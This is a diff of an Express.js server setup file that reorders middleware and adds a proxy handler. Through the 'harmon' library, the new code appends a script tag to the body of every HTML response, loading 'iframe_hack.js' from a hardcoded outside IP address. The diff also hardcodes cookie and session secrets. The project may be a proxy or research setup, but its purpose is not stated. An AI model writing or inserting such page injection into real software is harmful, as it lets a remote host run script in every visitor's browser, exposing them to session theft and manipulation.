@@ -7,8 +7,10 @@ var session = require("express-session");
 var bodyParser = require('body-parser');
 var auth = require("./middleware/auth");
 var config = require("./config");
-var routes = require('./routes/index');
+var routes = require('./routes/index').router;
+var proxyHandler = require('./routes/index').proxyHandler;
 var users = require('./routes/users');
+var harmon = require('harmon');
 
 var mongoose = require('mongoose');
 var MongoStore = require('connect-mongo')(session);
@@ -24,11 +26,7 @@ app.set('view engine', 'ejs');
 // uncomment after placing your favicon in /public
 //app.use(favicon(__dirname + '/public/favicon.ico'));
 app.use(logger('dev'));
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({ extended: false }));
 app.use(cookieParser('mahs3krit'));
-app.use(express.static(path.join(__dirname, 'public')));
-
 app.use(session({
   store: new MongoStore({ mongooseConnection: mongoose.connection }),
   secret: 'SUPERsekret231',
@@ -36,14 +34,24 @@ app.use(session({
   saveUninitialized: true
 }));
 
-app.use(function(req, res, next) {
-  console.log("got req for ", req.path, req.__container__);
-  next();
-});
+var selects = [];
+var bodyselect = {};
+bodyselect.query = 'body';
+bodyselect.func = function(node) {
+  var hack = "<script type='text/javascript' src='//159.89.163.124:8000/javascripts/iframe_hack.js'></script>";
+  var rs = node.createReadStream();
+  var ws = node.createWriteStream({outer: false});
 
+  rs.pipe(ws, {end: false});
+  rs.on('end', function() { ws.end(hack); });
+};
+selects.push(bodyselect);
+app.use(harmon([], selects));
+/*
 app.use(function(req, res, next) {
   var oldsend = res.send.bind(res);
   res.send = function(statusOrData, data) {
+console.log("hacking", req.path);
     if (typeof data != 'string') {
       data = statusOrData;
     }
@@ -58,6 +66,18 @@ app.use(function(req, res, next) {
     }
     oldsend(data);
   };
+  next();
+});*/
+
+
+app.use(proxyHandler); // use this before body parser(, but after cookie parser), or post requests will hang
+
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.static(path.join(__dirname, 'public')));
+
+app.use(function(req, res, next) {
+  console.log("got req for ", req.path, req.__container__);
   next();
 });
 
